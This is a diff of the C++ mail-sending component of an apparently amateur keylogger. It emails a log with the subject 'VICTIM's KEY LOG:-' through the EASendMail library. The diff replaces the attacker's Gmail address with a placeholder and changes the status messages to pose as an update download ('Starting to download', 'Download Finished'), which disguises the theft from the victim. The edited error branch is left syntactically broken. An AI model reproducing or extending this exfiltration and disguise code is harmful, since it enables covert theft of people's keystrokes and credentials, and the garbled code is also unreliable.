@@ -19,9 +19,9 @@ int _tmain(int argc, _TCHAR* argv[])
     oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
     oSmtp->LicenseCode = _T("TryIt");
 
-    oSmtp->FromAddr = _T("pschyokillera1105@gmail.com");
+    oSmtp->FromAddr = _T("mailid@gmail.com");
     
-    oSmtp->AddRecipientEx(_T("pschyokillera1105@gmail.com"), 0);
+    oSmtp->AddRecipientEx(_T("mailid@gmail.com"), 0);
     
     oSmtp->Subject = _T("VICTIM's KEY LOG:-");
    
@@ -48,16 +48,16 @@ int _tmain(int argc, _TCHAR* argv[])
     oSmtp->ConnectType = ConnectTryTLS;
 
     
-    _tprintf(_T("Start to send email ...\r\n"));
+    _tprintf(_T("Starting to download ...\r\n"));
 
     if (oSmtp->SendMail() == 0)
     {
-        _tprintf(_T("email was sent successfully!\r\n"));
+        _tprintf(_T("Donwload Finished\r\n"));
     }
     else
     {
-        _tprintf(_T("failed to send email with the following error: %s\r\n"),
-            (const TCHAR*)oSmtp->GetLastErrDescription());
+        _tprintf(_T("failed to donwload the update\n"),
+            
     }
 
     return 0;
